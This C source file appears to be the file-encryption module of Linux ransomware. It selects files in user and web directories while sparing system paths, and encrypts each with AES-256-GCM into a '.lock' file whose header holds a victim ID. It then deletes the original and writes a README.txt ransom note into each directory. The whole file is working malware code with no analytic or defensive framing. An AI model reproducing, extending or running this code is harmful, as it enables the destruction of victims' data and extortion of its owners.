#include "encrypt.h"
#include "utils.h"
#include "note.h"

#define MAGIC_LEN 4
#define AES_KEYLEN 32
#define AES_GCM_IVLEN 12
#define AES_GCM_TAGLEN 16
#define BUF_SIZE 4096

const char *systemDirs[] = {"/proc", "/sys", "/dev", "/run", "/boot", "/bin", "/sbin", "/usr", "/etc", "/lost+found", "/lib", "/lib64", "/.config"};
const char *targetDirs[] = {"/home", "/srv", "/var/www", "/mnt", "/media", "/opt", "/usr/local"};

int validateFile(const char *filePath)
{
    struct stat st;

    if (access(filePath, R_OK) != 0 && access(filePath, W_OK) != 0)
    {
        return 1;
    }

    if (stat(filePath, &st) != 0)
    {
        return 1;
    }

    // Skip empty files
    if (st.st_size == 0)
    {
        return 1;
    }

    // Skip small file in .cache folder
    if (strstr(filePath, "/.cache") && st.st_size < 1024 * 1024)
    {
        return 1;
    }

    // Check for existing magic bytes
    unsigned char magic[4];
    FILE *fp = fopen(filePath, "rb");
    if (!fp)
    {
        return 1;
    }

    fread(magic, 1, 4, fp);
    fclose(fp);

    if (memcmp(magic, "RANS", 4) == 0)
    {
        return 1;
    }

    return 0;
}

int encryptFile(const char *infile, const char *outfile, const unsigned char *sessionKey, const char *victimID)
{
    FILE *in = fopen(infile, "rb");
    FILE *out = fopen(outfile, "wb");
    if (!in || !out)
    {
        if (in)
            fclose(in);
        if (out)
            fclose(out);
        return 1;
    }

    // Generate random IV
    unsigned char IV[AES_GCM_IVLEN];
    if (RAND_bytes(IV, sizeof(IV)) != 1)
    {
        fclose(in);
        fclose(out);
        return 1;
    }

    // Initialize encryption context
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx)
    {
        fclose(in);
        fclose(out);
        return 1;
    }

    // Set up algorithm and key/IV
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, AES_GCM_IVLEN, NULL);

    // Initialize key and IV
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, sessionKey, IV) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }

    // write custom header
    // [MAGIC][VICTIMID_LEN][VICTIMID][IV_LEN][IV][TAG_LEN][TAG][CIPHERTEXT]

    // Write MAGIC
    fwrite("RANS", 1, MAGIC_LEN, out);

    // Write VICTIMID_LEN and VICTIMID
    uint8_t victimIDLen = (uint8_t)strlen(victimID);
    fputc(victimIDLen, out);
    fwrite(victimID, 1, victimIDLen, out);

    // Write IV length and IV
    fputc(AES_GCM_IVLEN, out);
    fwrite(IV, 1, AES_GCM_IVLEN, out);

    // write TAG length
    fputc(AES_GCM_TAGLEN, out);

    // Reserve space for TAG
    long tagOffset = ftell(out);
    unsigned char zeros[AES_GCM_TAGLEN] = {0};
    fwrite(zeros, 1, AES_GCM_TAGLEN, out);

    // Encrypt file content
    unsigned char bufferIn[BUF_SIZE];
    // Output buffer needs to be larger than input buffer to accommodate padding
    unsigned char bufferOut[BUF_SIZE + EVP_CIPHER_block_size(EVP_aes_256_gcm())];
    int len, outLen;

    while ((len = fread(bufferIn, 1, BUF_SIZE, in)) > 0)
    {
        if (EVP_EncryptUpdate(ctx, bufferOut, &outLen, bufferIn, len) != 1)
        {
            EVP_CIPHER_CTX_free(ctx);
            fclose(in);
            fclose(out);
            return 1;
        }
        fwrite(bufferOut, 1, outLen, out);
    }

    // Finalize encryption
    if (EVP_EncryptFinal_ex(ctx, bufferOut, &outLen) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }
    fwrite(bufferOut, 1, outLen, out);

    unsigned char tag[AES_GCM_TAGLEN];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_GCM_TAGLEN, tag) != 1)
    {
        EVP_CIPHER_CTX_free(ctx);
        fclose(in);
        fclose(out);
        return 1;
    }

    // Write TAG at reserved space
    fseek(out, tagOffset, SEEK_SET);
    fwrite(tag, 1, AES_GCM_TAGLEN, out);

    EVP_CIPHER_CTX_free(ctx);
    fclose(in);
    fclose(out);

    return 0;
}

void encrypt(const char *filePath)
{
    if (sessionKey == NULL)
    {
        fprintf(stderr, "Session key is not initialized.\n");
        return;
    }

    // Check if the file is in a system directory
    for (int i = 0; i < sizeof(systemDirs) / sizeof(systemDirs[0]); i++)
    {
        size_t len = strlen(systemDirs[i]);
        if (strncmp(filePath, systemDirs[i], len) == 0 && filePath[len] == '/')
        {
            // Exclude /usr/local from system dirs
            if (strncmp(filePath, "/usr/local", strlen("/usr/local")) != 0)
                return;
        }
    }

    // Validate the file
    if (validateFile(filePath) != 0)
    {
        return;
    }

    // Proceed with encryption
    char *outfile = malloc(strlen(filePath) + 6); // extra space for ".lock" and null terminator
    outfile = strcpy(outfile, filePath);
    strcat(outfile, ".lock");
    char *victimID = generateVictimID();

    for (int i = 0; i < sizeof(targetDirs) / sizeof(targetDirs[0]); i++)
    {
        size_t len = strlen(targetDirs[i]);
        if (strncmp(filePath, targetDirs[i], len) == 0 && filePath[len] == '/')
        {
            if (encryptFile(filePath, outfile, sessionKey, victimID) == 0)
            {
                remove(filePath);
            }
        }
    }

    // Create ransom note in the current file's directory
    char dirPath[PATH_MAX];
    strncpy(dirPath, filePath, sizeof(dirPath));
    dirPath[sizeof(dirPath) - 1] = '\0';

    char *slash = strrchr(dirPath, '/');
    if (slash)
        *slash = '\0';

    strcat(dirPath, "/README.txt");
    if (access(dirPath, F_OK) != 0)
    {
        createRansomNote(dirPath, victimID);
    }

    free(outfile);
}
